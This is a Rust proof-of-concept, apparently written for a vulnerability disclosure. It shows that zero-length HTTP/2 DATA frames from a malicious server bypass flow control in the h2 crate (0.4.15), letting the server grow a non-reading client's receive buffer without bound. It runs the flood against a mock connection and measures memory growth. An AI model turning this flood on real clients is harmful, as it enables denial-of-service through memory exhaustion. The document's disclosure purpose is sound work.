// PoC for finding D: zero-length DATA frames bypass the HTTP/2 receive-window flow control that
// bounds a payload flood, letting a malicious SERVER grow a non-reading client's recv buffer
// without bound (~22x amplification: 9 wire bytes -> ~197 buffered bytes). Pin 9416dc87 (h2 0.4.15).
//
// Clean differential against a NATIVE h2 client (default config, 65535 window), holding the
// response body WITHOUT reading it (a client applying backpressure — exactly when flow control is
// supposed to protect it). The GOAWAY on the payload arm is the oracle: it proves the window really
// does bound payload, so the zero-length arm's unbounded growth is a genuine bypass, not just
// "a slow client buffers stuff".
//   ARM 1 (payload): server overruns the window -> client emits GOAWAY(FLOW_CONTROL_ERROR). BOUNDED.
//   ARM 2 (0-byte):  server floods zero-length DATA -> no GOAWAY, recv buffer (RSS) climbs linearly.
use futures::StreamExt;
use h2::frame::Frame;
use h2_support::prelude::*;
use std::time::Duration;

fn rss_kb() -> i64 {
    let pid = std::process::id().to_string();
    std::process::Command::new("ps").args(["-o", "rss=", "-p", &pid]).output().ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .and_then(|s| s.trim().parse::<i64>().ok()).unwrap_or(-1)
}

/// Drive a native h2 client that holds the response body unread, feed it `n` DATA frames of `plen`
/// bytes, then observe what the client emits. Returns (goaway_seen, rss_delta_kb).
async fn arm(plen: usize, n: usize) -> (bool, i64) {
    let tag = if plen == 0 { "ARM 2  0-byte DATA " } else { "ARM 1 payload DATA " };
    let (io, mut srv) = mock::new_with_write_capacity(1 << 20);
    let (stop_tx, stop_rx) = tokio::sync::oneshot::channel::<()>();
    let client = tokio::spawn(async move {
        let (mut client, conn) = client::handshake(io).await.expect("h2 handshake");
        let ch = tokio::spawn(async move { let _ = conn.await; });
        let req = Request::get("https://example.com/").body(()).unwrap();
        let (resp, _s) = client.send_request(req, true).unwrap();
        let response = resp.await.expect("response");
        let _body = response.into_body(); // hold; never read; never release_capacity
        let _keep = (_body, client);
        let _ = stop_rx.await;
        ch.abort();
    });

    let _ = srv.assert_client_handshake().await;
    let id = loop {
        match srv.next().await {
            Some(Ok(Frame::Headers(h))) => break h.stream_id(),
            Some(Ok(_)) => continue,
            other => panic!("no request: {other:?}"),
        }
    };
    srv.send_frame(frames::headers(id).response(200)).await;

    let payload = vec![0u8; plen];
    let rss0 = rss_kb();
    let mut peak_delta = 0i64;
    let mut sent = 0usize;
    for _ in 0..n {
        let frame = frames::data(id, &payload[..]);
        match tokio::time::timeout(Duration::from_secs(3), srv.send(frame.into())).await {
            Ok(Ok(())) => sent += 1,
            _ => break,
        }
        if plen == 0 && sent % 200_000 == 0 {
            let d = rss_kb() - rss0;
            peak_delta = peak_delta.max(d);
            println!("  {tag}: {sent:>8} frames | recv-buffer RSS +{d} KB (peak +{peak_delta})");
        }
    }
    let rss_after_send = rss_kb();
    peak_delta = peak_delta.max(rss_after_send - rss0);

    // Read what the client emitted (GOAWAY on a window overrun; nothing on a zero-length flood).
    let mut goaway = false;
    let deadline = tokio::time::sleep(Duration::from_millis(600));
    tokio::pin!(deadline);
    loop {
        tokio::select! {
            _ = &mut deadline => break,
            f = srv.next() => match f {
                Some(Ok(Frame::GoAway(_))) => { goaway = true; break; }
                Some(Ok(_)) => {}
                _ => break,
            }
        }
    }
    let _ = stop_tx.send(());
    let _ = client.await;

    let delta = peak_delta;
    println!("  {tag}: sent {sent} frames of {plen}B -> GOAWAY(flow-control)={goaway}, recv-buffer RSS +{delta} KB");
    (goaway, delta)
}

#[tokio::main(flavor = "multi_thread", worker_threads = 4)]
async fn main() -> std::process::ExitCode {
    println!("h2 zero-length DATA flow-control bypass — native h2 client, default 65535 window\n");

    // ARM 1: payload overruns the window -> client MUST flow-control-error (bounded).
    let (p_goaway, _p_rss) = arm(16 * 1024, 64).await; // 1 MiB >> 65535
    println!();
    // ARM 2: zero-length flood -> never touches the window (unbounded).
    let (z_goaway, z_rss) = arm(0, 1_000_000).await;

    println!("\n==== RESULT");
    println!("  payload 1 MiB  : GOAWAY(flow-control) = {p_goaway}   (window bounds a payload flood)");
    println!("  0-byte x 1e6   : GOAWAY(flow-control) = {z_goaway}, recv-buffer +{z_rss} KB   (never bounded)");
    if p_goaway && !z_goaway && z_rss > 50_000 {
        let amp = (z_rss as f64 * 1024.0) / 1_000_000.0; // bytes buffered per frame; wire cost ~9 B
        println!("  => CONFIRMED: payload is bounded by flow control (GOAWAY); zero-length DATA bypasses it");
        println!("     entirely -> unbounded recv-buffer growth, ~{amp:.0} buffered bytes per 9-byte frame (~{:.0}x).", amp / 9.0);
        std::process::ExitCode::SUCCESS
    } else {
        println!("  => Differential not as predicted; inspect.");
        std::process::ExitCode::FAILURE
    }
}
